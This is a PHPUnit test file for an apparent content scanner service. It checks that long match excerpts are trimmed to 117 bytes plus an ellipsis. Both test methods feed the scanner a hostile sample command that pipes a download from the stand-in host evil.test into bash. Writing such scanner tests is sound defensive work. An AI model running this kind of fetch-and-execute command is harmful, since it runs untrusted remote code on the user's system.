<?php

/**
 * Excerpt length cap of {@see \OCA\OpenRegister\Service\ContentScanService}:
 * a long match is cut to 117 bytes plus an ellipsis, a short one is kept whole.
 *
 * @category Test
 * @package  OCA\OpenRegister\Tests\Unit\Service
 *
 * @author    Conduction Development Team <info@conduction.nl>
 * @copyright 2026 Conduction B.V.
 * @license   EUPL-1.2 https://joinup.ec.europa.eu/collection/eupl/eupl-text-eupl-12
 *
 * @link https://OpenRegister.app
 */

declare(strict_types=1);

namespace OCA\OpenRegister\Tests\Unit\Service;

use OCA\OpenRegister\Service\ContentScanService;
use PHPUnit\Framework\TestCase;
use Psr\Log\NullLogger;

/**
 * ContentScanServiceExcerptTest.
 */
class ContentScanServiceExcerptTest extends TestCase {
	public function testALongMatchIsCutTo117BytesAndAnEllipsis(): void {
		$command = 'curl https://evil.test/' . str_repeat('a', 150) . ' | bash';

		$finding = (new ContentScanService(new NullLogger()))->scan($command)['findings'][0];

		$this->assertSame(substr($command, 0, 117) . '…', $finding['excerpt']);
	}

	public function testAMatchOfExactly120BytesIsKeptWhole(): void {
		$command = 'curl https://evil.test/' . str_repeat('a', 120 - strlen('curl https://evil.test/ | bash')) . ' | bash';

		$finding = (new ContentScanService(new NullLogger()))->scan($command)['findings'][0];

		$this->assertSame(120, strlen($command));
		$this->assertSame($command, $finding['excerpt']);
	}
}
